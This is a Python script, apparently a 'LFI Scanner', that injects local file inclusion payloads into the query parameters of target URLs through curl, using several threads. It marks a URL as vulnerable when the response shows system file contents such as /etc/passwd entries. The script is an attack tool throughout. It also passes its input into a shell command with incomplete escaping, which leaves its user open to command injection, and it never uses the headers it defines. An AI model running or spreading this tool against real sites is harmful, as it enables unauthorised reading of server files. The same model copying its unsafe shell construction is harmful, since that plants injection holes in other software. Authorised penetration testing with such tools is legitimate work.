#!/usr/bin/env python3
import subprocess
import argparse
import sys
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor

# Define LFI errors
lfi_errors = ["root:x:", "bin:x", "daemon", "syntax", "bin:x", "mysql_", "mysql", "shutdown", "ftp", "cpanel", "/bin/bash", "/usr/sbin", "www-data", "root:x:0:0:root:", "syslog"]

def scan_url(url, payload, headers, verbose, output_file=None):
    url_components = urlparse(url)
    query_params = parse_qs(url_components.query)

    for key in query_params.keys():
        original_values = query_params[key]

        # Modify payload to avoid breaking shell commands
        payload = payload.replace('"', r'\"')

        # Inject payload into the URL
        query_params[key] = [payload]
        url_modified = urlunparse((url_components.scheme, url_components.netloc, url_components.path, url_components.params, urlencode(query_params, doseq=True), url_components.fragment))
        query_params[key] = original_values

        # Execute curl command
        command = f'curl -s -i --url "{url_modified}"'

        if verbose:
            print(f"Testing URL: {url_modified} Payload: {payload}")

        try:
            output_bytes = subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            print(f"Error accessing {url}: {e.output.decode()}")
            continue

        output_str = output_bytes.decode('utf-8', errors='ignore')

        # Check for LFI errors in response
        lfi_matches = [error for error in lfi_errors if error in output_str]
        if lfi_matches:
            print(f"\nLOCAL FILE INCLUSION ERROR FOUND ON {url_modified}")
            for match in lfi_matches:
                print(f" Match Words: {match}")

            # Save found URL to output file, if specified
            if output_file:
                with open(output_file, 'a') as file:
                    file.write(url_modified + '\n')

def process_url(url, payloads, headers, verbose, output_file):
    # Check if the URL contains '='
    if '=' not in url:
        print(f"Skipping URL (no '=' found): {url}")
        return

    for payload in payloads:
        scan_url(url, payload, headers, verbose, output_file)

def main():
    parser = argparse.ArgumentParser(description="LFI Scanner")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Provide a single URL for testing", type=str)
    group.add_argument("-l", "--list", help="Provide a file containing a list of URLs for testing", type=str)
    parser.add_argument("-p", "--payloads", required=True, help="Provide a list of LFI payloads for testing", type=str)
    parser.add_argument("-t", "--threads", type=int, choices=range(1, 11), help="Number of threads to use (1-10)", default=5)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for detailed output")
    parser.add_argument("-o", "--output", help="Optional output file to save found LFI URLs", type=str)

    args = parser.parse_args()

    # Load payloads
    with open(args.payloads, 'r') as f:
        payloads = f.read().splitlines()

    # Define headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate'
    }

    # If scanning a single URL
    if args.url:
        urls = [args.url]

    # If scanning a list of URLs
    if args.list:
        with open(args.list, 'r') as f:
            urls = f.read().splitlines()

    # Multithreading for faster scanning
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for url in urls:
            executor.submit(process_url, url, payloads, headers, args.verbose, args.output)

    print("Scanning completed.")

if __name__ == "__main__":
    main()
